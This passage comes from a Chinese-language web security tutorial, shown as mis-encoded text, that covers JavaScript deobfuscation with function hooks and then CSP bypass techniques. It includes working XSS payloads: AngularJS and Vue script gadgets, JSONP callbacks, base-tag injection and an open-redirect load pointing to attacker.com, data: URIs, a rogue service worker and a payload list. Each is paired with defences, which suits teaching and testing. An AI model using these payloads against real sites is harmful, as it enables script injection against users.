npx webcrack input.js -o output.js

# ä½¿ç”¨ de4js
# è®¿é—® https://lelinhtinh.github.io/de4js/
</code></pre>
<h3>2. æ‰‹åŠ¨åˆ†ææµç¨‹</h3>
<p><strong>æ­¥éª¤ 1: ç¾åŒ–ä»£ç </strong></p>
<pre><code class="language-javascript">// ä½¿ç”¨ Prettier æˆ– JS Beautifier
</code></pre>
<p><strong>æ­¥éª¤ 2: å­—ç¬¦ä¸²è§£å¯†</strong></p>
<pre><code class="language-javascript">// Hook è§£å¯†å‡½æ•°
const _decode = window._0x1a2b;
window._0x1a2b = function () {
  const result = _decode.apply(this, arguments);
  console.log(&quot;Decoded:&quot;, result);
  return result;
};
</code></pre>
<p><strong>æ­¥éª¤ 3: æ§åˆ¶æµè¿˜åŸ</strong></p>
<ul>
<li>ä½¿ç”¨è°ƒè¯•å™¨å•æ­¥æ‰§è¡Œ</li>
<li>ç»˜åˆ¶æ§åˆ¶æµå›¾</li>
<li>AST è½¬æ¢å·¥å…·</li>
</ul>
<p><strong>æ­¥éª¤ 4: å˜é‡é‡å‘½å</strong></p>
<pre><code class="language-javascript">// é€šè¿‡ä¸Šä¸‹æ–‡æ¨æ–­å˜é‡å«ä¹‰
// ä½¿ç”¨ IDE æ‰¹é‡é‡å‘½å
</code></pre>
<h3>3. åŠ¨æ€åˆ†æ</h3>
<p><strong>Hook å…³é”®å‡½æ•°</strong>:</p>
<pre><code class="language-javascript">// Hook fetch
const originalFetch = window.fetch;
window.fetch = function (...args) {
  console.log(&quot;Fetch:&quot;, args);
  return originalFetch.apply(this, args);
};

// Hook WebSocket
const originalWebSocket = window.WebSocket;
window.WebSocket = function (url) {
  console.log(&quot;WebSocket:&quot;, url);
  return new originalWebSocket(url);
};

// Hook eval
const originalEval = window.eval;
window.eval = function (code) {
  console.log(&quot;Eval:&quot;, code);
  return originalEval(code);
};
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>å¼€å‘è€…ï¼ˆåŠ å›ºæ–¹ï¼‰</h3>
<ol>
<li><p><strong>å¤šå±‚é˜²æŠ¤</strong>:</p>
<ul>
<li>æ··æ·† + è™šæ‹Ÿæœº + WebAssembly</li>
<li>ä¸è¦ä¾èµ–å•ä¸€ä¿æŠ¤</li>
</ul>
</li>
<li><p><strong>å…³é”®ä»£ç æœåŠ¡å™¨ç«¯</strong>:</p>
<ul>
<li>æ•æ„Ÿç®—æ³•æ”¾åœ¨åç«¯</li>
<li>å‰ç«¯åªåšå±•ç¤º</li>
</ul>
</li>
<li><p><strong>å®šæœŸæ›´æ–°</strong>:</p>
<ul>
<li>æ··æ·†ç­–ç•¥å®šæœŸå˜åŒ–</li>
<li>æ£€æµ‹ç»•è¿‡æ–¹æ³•å¹¶æ›´æ–°</li>
</ul>
</li>
<li><p><strong>æ€§èƒ½å¹³è¡¡</strong>:</p>
<ul>
<li>è¿‡åº¦æ··æ·†å½±å“æ€§èƒ½</li>
<li>è¯„ä¼°ä¿æŠ¤å¼ºåº¦ä¸æ€§èƒ½æŸå¤±</li>
</ul>
</li>
</ol>
<h3>é€†å‘åˆ†æè€…</h3>
<ol>
<li><p><strong>è‡ªåŠ¨åŒ–ä¼˜å…ˆ</strong>:</p>
<ul>
<li>å…ˆå°è¯•è‡ªåŠ¨åŒ–å·¥å…·</li>
<li>èŠ‚çœæ—¶é—´æˆæœ¬</li>
</ul>
</li>
<li><p><strong>åŠ¨æ€åˆ†æä¸ºä¸»</strong>:</p>
<ul>
<li>Hook å…³é”®å‡½æ•°</li>
<li>è¿è¡Œæ—¶è§‚å¯Ÿè¡Œä¸º</li>
</ul>
</li>
<li><p><strong>åˆ†æ¨¡å—æ”»å…‹</strong>:</p>
<ul>
<li>è¯†åˆ«æ ¸å¿ƒé€»è¾‘</li>
<li>å…¶ä»–éƒ¨åˆ†å¯ä»¥å¿½ç•¥</li>
</ul>
</li>
<li><p><strong>åˆæ³•åˆè§„</strong>:</p>
<ul>
<li>ä»…åœ¨æˆæƒèŒƒå›´å†…åˆ†æ</li>
<li>éµå®ˆæ³•å¾‹æ³•è§„</li>
</ul>
</li>
</ol>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: å‰ç«¯åŠ å›ºèƒ½å®Œå…¨é˜²æ­¢é€†å‘å—ï¼Ÿ</h3>
<p><strong>A</strong>: ä¸èƒ½ã€‚å‰ç«¯ä»£ç æœ€ç»ˆåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œç†è®ºä¸Šå¯ä»¥è¢«å®Œå…¨é€†å‘ã€‚åŠ å›ºåªèƒ½æé«˜é€†å‘éš¾åº¦å’Œæˆæœ¬ï¼Œå»¶ç¼“æ”»å‡»è€…ï¼Œä½†æ— æ³•å®Œå…¨é˜»æ­¢ã€‚</p>
<h3>Q: å“ªç§åŠ å›ºæ–¹å¼æœ€æœ‰æ•ˆï¼Ÿ</h3>
<p><strong>A</strong>: æ²¡æœ‰ç»å¯¹æœ€æœ‰æ•ˆçš„å•ä¸€æ–¹æ³•ã€‚æœ€ä½³å®è·µæ˜¯ï¼š</p>
<ol>
<li>å¤šå±‚é˜²æŠ¤ï¼ˆæ··æ·† + VM + Wasmï¼‰</li>
<li>å…³é”®é€»è¾‘æœåŠ¡å™¨ç«¯å¤„ç†</li>
<li>å®šæœŸæ›´æ–°é˜²æŠ¤ç­–ç•¥</li>
</ol>
<h3>Q: æ··æ·†ä¼šå½±å“æ€§èƒ½å—ï¼Ÿ</h3>
<p><strong>A</strong>: ä¼šã€‚ä¸åŒç¨‹åº¦çš„æ··æ·†å½±å“ä¸åŒï¼š</p>
<ul>
<li>å˜é‡åæ··æ·†ï¼šå‡ ä¹æ— å½±å“</li>
<li>æ§åˆ¶æµå¹³å¦åŒ–ï¼šæ˜¾è‘—å½±å“ï¼ˆ10-50%ï¼‰</li>
<li>è™šæ‹Ÿæœºä¿æŠ¤ï¼šé‡å¤§å½±å“ï¼ˆ2-10 å€æ…¢ï¼‰</li>
</ul>
<p>éœ€è¦åœ¨å®‰å…¨æ€§å’Œæ€§èƒ½é—´æƒè¡¡ã€‚</p>
<h3>Q: å¦‚ä½•æ£€æµ‹ä»£ç æ˜¯å¦è¢«æ··æ·†ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<pre><code class="language-javascript">// æ£€æµ‹ç‰¹å¾
const indicators = {
  shortVarNames: /^[a-z_$][0-9]{1,4}$/.test(someVar),
  hexStrings: code.includes(&quot;\\x&quot;),
  evalUsage: code.includes(&quot;eval(&quot;),
  longLines: code.split(&quot;\n&quot;).some((l) =&gt; l.length &gt; 500),
  switchCases: (code.match(/switch/g) || []).length &gt; 10,
};

console.log(&quot;Obfuscation indicators:&quot;, indicators);
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-35">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></li>
<li><a href="#section-36">WebAssembly é€†å‘</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li>æµè§ˆå™¨è°ƒè¯•æŠ€å·§</li>
<li>AST åˆ†æä¸è½¬æ¢</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-39">
                                                <h2>[R38] CSP Bypass</h2>
                                                <h1>R38: CSP ç»•è¿‡æŠ€æœ¯</h1>
<h2>æ¦‚è¿°</h2>
<p>å†…å®¹å®‰å…¨ç­–ç•¥ (Content Security Policy, CSP) æ˜¯ä¸€ç§é‡è¦çš„ Web å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé˜²å¾¡ XSS å’Œæ•°æ®æ³¨å…¥æ”»å‡»ã€‚ç„¶è€Œï¼Œé…ç½®ä¸å½“çš„ CSP å¯èƒ½è¢«ç»•è¿‡ã€‚æœ¬æ–‡ä»‹ç» CSP çš„å·¥ä½œåŸç†ä»¥åŠå¸¸è§çš„ç»•è¿‡æŠ€æœ¯ã€‚</p>
<hr />
<h2>åŸºç¡€æ¦‚å¿µ</h2>
<h3>å®šä¹‰</h3>
<p><strong>CSP (Content Security Policy)</strong> æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œé€šè¿‡ HTTP å“åº”å¤´æˆ– meta æ ‡ç­¾æŒ‡å®šæµè§ˆå™¨å¯ä»¥ä»å“ªäº›æ¥æºåŠ è½½èµ„æºã€‚å®ƒæ˜¯ä¸€ç§ç™½åå•æœºåˆ¶ï¼Œèƒ½æœ‰æ•ˆå‡å°‘ XSS æ”»å‡»é¢ã€‚</p>
<p><strong>åŸºæœ¬è¯­æ³•</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: directive source; directive source
</code></pre>
<p><strong>å¸¸è§æŒ‡ä»¤</strong>:</p>
<ul>
<li><code>default-src</code>: é»˜è®¤ç­–ç•¥</li>
<li><code>script-src</code>: JavaScript æ¥æº</li>
<li><code>style-src</code>: CSS æ¥æº</li>
<li><code>img-src</code>: å›¾ç‰‡æ¥æº</li>
<li><code>connect-src</code>: XMLHttpRequestã€WebSocket ç­‰è¿æ¥æ¥æº</li>
<li><code>font-src</code>: å­—ä½“æ¥æº</li>
<li><code>object-src</code>: <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;applet&gt;</code> æ¥æº</li>
<li><code>media-src</code>: <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code> æ¥æº</li>
<li><code>frame-src</code>: æ¡†æ¶æ¥æº</li>
</ul>
<h3>æ ¸å¿ƒåŸç†</h3>
<h4>CSP å·¥ä½œæµç¨‹</h4>
<ol>
<li>æœåŠ¡å™¨å‘é€ CSP å¤´éƒ¨</li>
<li>æµè§ˆå™¨è§£æç­–ç•¥</li>
<li>æµè§ˆå™¨æ£€æŸ¥æ¯ä¸ªèµ„æºåŠ è½½è¯·æ±‚</li>
<li>è¿åç­–ç•¥çš„è¯·æ±‚è¢«é˜»æ­¢</li>
<li>è¿è§„æŠ¥å‘Šï¼ˆå¦‚é…ç½®äº† <code>report-uri</code>ï¼‰</li>
</ol>
<h4>CSP çº§åˆ«</h4>
<ul>
<li><strong>CSP Level 1</strong> (2012): åŸºç¡€æŒ‡ä»¤ï¼Œç™½åå•æœºåˆ¶</li>
<li><strong>CSP Level 2</strong> (2015): æ·»åŠ  <code>nonce</code> å’Œ <code>hash</code>ï¼Œæ›´å¤šæŒ‡ä»¤</li>
<li><strong>CSP Level 3</strong> (è‰æ¡ˆ): <code>strict-dynamic</code>ï¼Œ<code>unsafe-hashes</code> ç­‰</li>
</ul>
<hr />
<h2>è¯¦ç»†å†…å®¹</h2>
<h3>CSP é…ç½®ç¤ºä¾‹</h3>
<h4>ä¸¥æ ¼ CSP (æ¨è)</h4>
<pre><code class="language-http">Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-random123' 'strict-dynamic';
  style-src 'nonce-random456';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self';
  base-uri 'none';
  form-action 'self';
</code></pre>
<h4>å®½æ¾ CSP (æ˜“å—æ”»å‡»)</h4>
<pre><code class="language-http">Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
</code></pre>
<h3>ä¸»è¦ç»•è¿‡æŠ€æœ¯</h3>
<h4>1. <strong>åˆ©ç”¨ç™½åå• CDN</strong></h4>
<p>å¦‚æœ CSP å…è®¸æŸäº› CDNï¼Œæ”»å‡»è€…å¯ä»¥å¯»æ‰¾è¯¥ CDN ä¸Šçš„å¯åˆ©ç”¨è„šæœ¬ã€‚</p>
<p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-html">&lt;!-- åˆ©ç”¨ CDN ä¸Šçš„ AngularJS --&gt;
&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js&quot;&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;{{ constructor.constructor('alert(1)')() }}&lt;/div&gt;

&lt;!-- åˆ©ç”¨ JSONP ç«¯ç‚¹ --&gt;
&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;
</code></pre>
<p><strong>å¸¸è§å¯åˆ©ç”¨çš„åº“</strong>:</p>
<ul>
<li>AngularJS: æ¨¡æ¿æ³¨å…¥</li>
<li>jQuery: JSONP</li>
<li>Prototype.js: DOM æ³¨å…¥</li>
<li>Google Analytics: <code>_gaq.push</code></li>
</ul>
<h4>2. <strong>åˆ©ç”¨ <code>unsafe-inline</code> å’Œ <code>unsafe-eval</code></strong></h4>
<p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-html">&lt;!-- unsafe-inline å…è®¸å†…è”è„šæœ¬ --&gt;
&lt;script&gt;
  alert(document.domain);
&lt;/script&gt;

&lt;!-- unsafe-eval å…è®¸ eval --&gt;
&lt;script&gt;
  eval(&quot;alert(1)&quot;);
&lt;/script&gt;
&lt;script&gt;
  setTimeout(&quot;alert(1)&quot;, 0);
&lt;/script&gt;
&lt;script&gt;
  Function(&quot;alert(1)&quot;)();
&lt;/script&gt;
</code></pre>
<h4>3. <strong>Base æ ‡ç­¾æ³¨å…¥</strong></h4>
<p>å¦‚æœ CSP æ²¡æœ‰è®¾ç½® <code>base-uri</code>ï¼Œå¯ä»¥é€šè¿‡æ³¨å…¥ <code>&lt;base&gt;</code> æ ‡ç­¾åŠ«æŒç›¸å¯¹è·¯å¾„ã€‚</p>
<p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self'
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-html">&lt;!-- åŸå§‹é¡µé¢æœ‰ç›¸å¯¹è·¯å¾„è„šæœ¬ --&gt;
&lt;!-- &lt;script src=&quot;/js/app.js&quot;&gt;&lt;/script&gt; --&gt;

&lt;!-- æ³¨å…¥ base æ ‡ç­¾ --&gt;
&lt;base href=&quot;https://attacker.com/&quot; /&gt;

&lt;!-- ç°åœ¨ /js/app.js ä¼šä» https://attacker.com/js/app.js åŠ è½½ --&gt;
</code></pre>
<p><strong>é˜²å¾¡</strong>: è®¾ç½® <code>base-uri 'none'</code> æˆ– <code>base-uri 'self'</code></p>
<h4>4. <strong>åˆ©ç”¨ Nonce é‡ç”¨</strong></h4>
<p>å¦‚æœåŒä¸€ä¸ª nonce åœ¨å¤šä¸ªè„šæœ¬ä¸­é‡ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä½¿ç”¨ç›¸åŒ nonce çš„è„šæœ¬ã€‚</p>
<p><strong>æ˜“å—æ”»å‡»çš„ä»£ç </strong>:</p>
<pre><code class="language-html">&lt;!-- æœåŠ¡å™¨ä½¿ç”¨å›ºå®šæˆ–å¯é¢„æµ‹çš„ nonce --&gt;
&lt;script nonce=&quot;abc123&quot; src=&quot;/static/app.js&quot;&gt;&lt;/script&gt;

&lt;!-- æ”»å‡»è€…æ³¨å…¥ --&gt;
&lt;script nonce=&quot;abc123&quot;&gt;
  alert(1);
&lt;/script&gt;
</code></pre>
<p><strong>é˜²å¾¡</strong>: æ¯ä¸ªè¯·æ±‚ç”Ÿæˆéšæœº nonce</p>
<h4>5. <strong>åˆ©ç”¨ Script Gadgets</strong></h4>
<p>æŸäº›æ¡†æ¶æˆ–åº“æä¾›çš„åŠŸèƒ½å¯ä»¥è¢«æ»¥ç”¨æ¥æ‰§è¡Œä»£ç ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šAngularJS (CSP æ¨¡å¼)</strong>:</p>
<pre><code class="language-html">&lt;div ng-app ng-csp&gt;{{ constructor.constructor('alert(1)')() }}&lt;/div&gt;
</code></pre>
<p><strong>ç¤ºä¾‹ï¼šVue.js</strong>:</p>
<pre><code class="language-html">&lt;div id=&quot;app&quot;&gt;{{ constructor.constructor('alert(1)')() }}&lt;/div&gt;
&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2&quot;&gt;&lt;/script&gt;
&lt;script&gt;
  new Vue({ el: &quot;#app&quot; });
&lt;/script&gt;
</code></pre>
<h4>6. <strong>åˆ©ç”¨ Dangling Markup</strong></h4>
<p>é€šè¿‡ä¸é—­åˆæ ‡ç­¾æ¥&quot;å¸æ”¶&quot;åç»­å†…å®¹ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-html">&lt;!-- æ³¨å…¥ç‚¹ --&gt;
&lt;input value=&quot;[INJECTION]&quot;&gt;

&lt;!-- æ³¨å…¥å†…å®¹ --&gt;
&lt;input value=&quot;&lt;base href='https://attacker.com/'&gt;

&lt;!-- åç»­æ‰€æœ‰ç›¸å¯¹é“¾æ¥å°†æŒ‡å‘æ”»å‡»è€…æœåŠ¡å™¨ --&gt;
</code></pre>
<h4>7. <strong>åˆ©ç”¨ iframe å’Œ srcdoc</strong></h4>
<p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self'
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-html">&lt;iframe srcdoc=&quot;&lt;script&gt;alert(origin)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p><strong>æ³¨æ„</strong>: <code>srcdoc</code> ç»§æ‰¿çˆ¶é¡µé¢çš„ CSPï¼Œä½†æŸäº›æµè§ˆå™¨å®ç°æœ‰ç¼ºé™·ã€‚</p>
<p><strong>é˜²å¾¡</strong>: è®¾ç½® <code>frame-src</code> å’Œ <code>child-src</code></p>
<h4>8. <strong>åˆ©ç”¨é‡å®šå‘</strong></h4>
<p>å¦‚æœç™½åå•åŸŸåå­˜åœ¨å¼€æ”¾é‡å®šå‘æ¼æ´ï¼š</p>
<p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://trusted.com
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-html">&lt;!-- trusted.com æœ‰å¼€æ”¾é‡å®šå‘ --&gt;
&lt;script src=&quot;https://trusted.com/redirect?url=https://attacker.com/evil.js&quot;&gt;&lt;/script&gt;
</code></pre>
<h4>9. <strong>åˆ©ç”¨ <code>data:</code> URI</strong></h4>
<p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' data:
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-html">&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;
&lt;object data=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/object&gt;
</code></pre>
<p><strong>é˜²å¾¡</strong>: é¿å…åœ¨ <code>script-src</code> ä¸­ä½¿ç”¨ <code>data:</code></p>
<h4>10. <strong>åˆ©ç”¨ Service Worker</strong></h4>
<p>Service Worker å¯ä»¥æ‹¦æˆªå’Œä¿®æ”¹ç½‘ç»œè¯·æ±‚ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">// æ³¨å†Œæ¶æ„ Service Worker
navigator.serviceWorker.register(&quot;/evil-sw.js&quot;);

// evil-sw.js
self.addEventListener(&quot;fetch&quot;, (event) =&gt; {
  if (event.request.url.includes(&quot;legitimate.js&quot;)) {
    event.respondWith(new Response(&quot;alert(1)&quot;));
  }
});
</code></pre>
<p><strong>é˜²å¾¡</strong>: ä¸¥æ ¼é™åˆ¶ Service Worker çš„æ¥æº</p>
<hr />
<h2>å®æˆ˜ç¤ºä¾‹</h2>
<h3>ç¤ºä¾‹ 1: æ£€æµ‹ CSP é…ç½®</h3>
<pre><code class="language-javascript">// æå–é¡µé¢çš„ CSP ç­–ç•¥
function getCSP() {
  // æ–¹æ³•1: ä» meta æ ‡ç­¾
  const metaCSP = document.querySelector(
    'meta[http-equiv=&quot;Content-Security-Policy&quot;]'
  );
  if (metaCSP) {
    console.log(&quot;Meta CSP:&quot;, metaCSP.content);
  }

  // æ–¹æ³•2: é€šè¿‡è¿è§„æµ‹è¯•
  const img = new Image();
  img.onerror = () =&gt; console.log(&quot;Image blocked by CSP&quot;);
  img.src = &quot;https://attacker.com/test.jpg&quot;;

  // æ–¹æ³•3: æŸ¥çœ‹æ§åˆ¶å°é”™è¯¯
  console.log(&quot;Check console for CSP violations&quot;);
}

getCSP();
</code></pre>
<h3>ç¤ºä¾‹ 2: è‡ªåŠ¨åŒ– CSP ç»•è¿‡æµ‹è¯•</h3>
<pre><code class="language-javascript">// CSP Bypass Checker
const payloads = [
  &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;,
  &quot;&lt;img src=x onerror=alert(1)&gt;&quot;,
  &quot;&lt;svg onload=alert(1)&gt;&quot;,
  '&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;',
  '&lt;base href=&quot;https://attacker.com/&quot;&gt;',
  '&lt;link rel=&quot;import&quot; href=&quot;https://attacker.com/evil.html&quot;&gt;',
  '&lt;object data=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;',
];

function testCSP() {
  payloads.forEach((payload, i) =&gt; {
    try {
      const div = document.createElement(&quot;div&quot;);
      div.innerHTML = payload;
      document.body.appendChild(div);
      console.log(`Payload ${i} injected:`, payload);
    } catch (e) {
      console.log(`Payload ${i} blocked:`, e.message);
    }
  });
}

testCSP();
</code></pre>
<h3>ç¤ºä¾‹ 3: åˆ©ç”¨ AngularJS ç»•è¿‡ CSP</h3>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta
      http-equiv=&quot;Content-Security-Policy&quot;
      content=&quot;script-src 'self' https://ajax.googleapis.com&quot;
    /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;!-- åŠ è½½ AngularJS --&gt;
    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js&quot;&gt;&lt;/script&gt;

    &lt;!-- CSP ç»•è¿‡ --&gt;
    &lt;div ng-app ng-csp&gt;
      {{ constructor.constructor('alert(document.domain)')() }}
    &lt;/div&gt;

    &lt;!-- æˆ–è€…ä½¿ç”¨ ng-focus --&gt;
    &lt;input
      ng-app
      ng-csp
      ng-focus=&quot;constructor.constructor('alert(1)')()&quot;
      autofocus
    /&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>é˜²å¾¡æ–¹</h3>
<ol>
<li><p><strong>ä½¿ç”¨ä¸¥æ ¼çš„ CSP</strong></p>
<pre><code class="language-http">Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-RANDOM' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
</code></pre>
</li>
<li><p><strong>é¿å…ä½¿ç”¨ä¸å®‰å…¨çš„æŒ‡ä»¤</strong></p>
<ul>
<li>ç¦ç”¨ <code>'unsafe-inline'</code></li>
<li>ç¦ç”¨ <code>'unsafe-eval'</code></li>
<li>ç¦ç”¨ <code>data:</code> URIï¼ˆå¯¹äºè„šæœ¬ï¼‰</li>
</ul>
</li>
<li><p><strong>ä½¿ç”¨ Nonce æˆ– Hash</strong></p>
<pre><code class="language-html">&lt;!-- æ¯æ¬¡è¯·æ±‚ç”Ÿæˆéšæœº nonce --&gt;
&lt;script nonce=&quot;{{ random_nonce }}&quot;&gt;
  // å†…è”è„šæœ¬
&lt;/script&gt;
</code></pre>
</li>
<li><p><strong>é™åˆ¶ CDN ç™½åå•</strong></p>
<ul>
<li>ä»…å…è®¸å¿…è¦çš„ CDN</li>
<li>ä½¿ç”¨ SRI (Subresource Integrity) éªŒè¯</li>
</ul>
<pre><code class="language-html">&lt;script
  src=&quot;https://cdn.example.com/lib.js&quot;
  integrity=&quot;sha384-...&quot;
  crossorigin=&quot;anonymous&quot;
&gt;&lt;/script&gt;
</code></pre>
</li>
<li><p><strong>ä½¿ç”¨ CSP æŠ¥å‘Š</strong></p>
<pre><code class="language-http">Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-report
</code></pre>
</li>
</ol>
<h3>æ”»å‡»æ–¹ï¼ˆæ¸—é€æµ‹è¯•ï¼‰</h3>
<ol>
<li><p><strong>æ”¶é›†ä¿¡æ¯</strong></p>
<ul>
<li>æŸ¥çœ‹ HTTP å“åº”å¤´</li>
<li>æ£€æŸ¥ <code>&lt;meta&gt;</code> æ ‡ç­¾</li>
<li>æŸ¥çœ‹æ§åˆ¶å° CSP è¿è§„æŠ¥å‘Š</li>
</ul>
</li>
<li><p><strong>è¯†åˆ«å¼±ç‚¹</strong></p>
<ul>
<li>æ˜¯å¦ä½¿ç”¨ <code>unsafe-inline</code> æˆ– <code>unsafe-eval</code></li>
<li>ç™½åå•æ˜¯å¦åŒ…å«å¯åˆ©ç”¨çš„ CDN</li>
<li>æ˜¯å¦ç¼ºå°‘ <code>base-uri</code> é™åˆ¶</li>
</ul>
</li>
<li><p><strong>æ„é€  Payload</strong></p>
<ul>
<li>æ ¹æ®å…è®¸çš„æ¥æºé€‰æ‹©æ”»å‡»å‘é‡</li>
<li>æµ‹è¯• Script Gadgets</li>
<li>å°è¯•åè®®çº§ç»•è¿‡</li>
</ul>
</li>
<li><p><strong>éªŒè¯ç»•è¿‡</strong></p>
<ul>
<li>åœ¨æµè§ˆå™¨ä¸­æµ‹è¯•</li>
<li>æ£€æŸ¥æ˜¯å¦è§¦å‘ CSP è¿è§„</li>
<li>ç¡®è®¤ä»£ç æ‰§è¡Œ</li>
</ul>
</li>
</ol>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: CSP èƒ½å®Œå…¨é˜²æ­¢ XSS å—ï¼Ÿ</h3>
<p><strong>A</strong>: ä¸èƒ½ã€‚CSP æ˜¯æ·±åº¦é˜²å¾¡çš„ä¸€å±‚ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘ XSS æ”»å‡»é¢ï¼Œä½†ï¼š</p>
<ul>
<li>é…ç½®ä¸å½“çš„ CSP å¯èƒ½è¢«ç»•è¿‡</li>
<li>ä¸ä¿æŠ¤æœåŠ¡å™¨ç«¯æ¼æ´</li>
<li>æŸäº›æµè§ˆå™¨æ”¯æŒä¸å®Œæ•´</li>
<li>éœ€è¦é…åˆå…¶ä»–å®‰å…¨æªæ–½ï¼ˆè¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç ç­‰ï¼‰</li>
</ul>
<h3>Q: <code>strict-dynamic</code> æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>A</strong>: <code>'strict-dynamic'</code> æ˜¯ CSP Level 3 çš„ç‰¹æ€§ï¼Œå…è®¸å¸¦æœ‰æœ‰æ•ˆ nonce/hash çš„è„šæœ¬åŠ¨æ€åŠ è½½å…¶ä»–è„šæœ¬ï¼š</p>
<pre><code class="language-http">Content-Security-Policy: script-src 'nonce-random' 'strict-dynamic'
</code></pre>
<p>å¥½å¤„ï¼š</p>
<ul>
<li>ç®€åŒ–ç­–ç•¥ç®¡ç†</li>
<li>è‡ªåŠ¨ä¿¡ä»»é€šè¿‡ nonce éªŒè¯çš„è„šæœ¬åŠ è½½çš„å­è„šæœ¬</li>
<li>å‘åå…¼å®¹</li>
</ul>
<h3>Q: å¦‚ä½•æµ‹è¯•æˆ‘çš„ CSP é…ç½®ï¼Ÿ</h3>
<p><strong>A</strong>: ä½¿ç”¨ä»¥ä¸‹å·¥å…·ï¼š</p>
<ol>
<li><strong>Google CSP Evaluator</strong>: https://csp-evaluator.withgoogle.com/</li>
<li><strong>CSP Scanner</strong>: æµè§ˆå™¨æ‰©å±•</li>
<li><strong>æ‰‹åŠ¨æµ‹è¯•</strong>: æ³¨å…¥å„ç§ XSS payload</li>
<li><strong>Report-Only æ¨¡å¼</strong>: å…ˆè§‚å¯Ÿè€Œä¸é˜»æ­¢</li>
</ol>
<h3>Q: Nonce å’Œ Hash æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>Nonce</strong> (Number used once):</p>
<ul>
<li>æœåŠ¡å™¨ä¸ºæ¯ä¸ªè¯·æ±‚ç”Ÿæˆéšæœºå€¼</li>
<li>è„šæœ¬æ ‡ç­¾å¿…é¡»åŒ…å«åŒ¹é…çš„ nonce</li>
<li>åŠ¨æ€å†…å®¹å‹å¥½</li>
</ul>
<pre><code class="language-html">&lt;script nonce=&quot;r@nd0m&quot;&gt;
  alert(1);
&lt;/script&gt;
</code></pre>
<p><strong>Hash</strong>:</p>
<ul>
<li>å¯¹è„šæœ¬å†…å®¹è®¡ç®—å“ˆå¸Œå€¼</li>
<li>è„šæœ¬å†…å®¹å¿…é¡»ä¸å“ˆå¸Œå®Œå…¨åŒ¹é…</li>
<li>é€‚åˆé™æ€è„šæœ¬</li>
</ul>
<pre><code class="language-http">Content-Security-Policy: script-src 'sha256-hash_of_script_content'
</code></pre>
<hr />
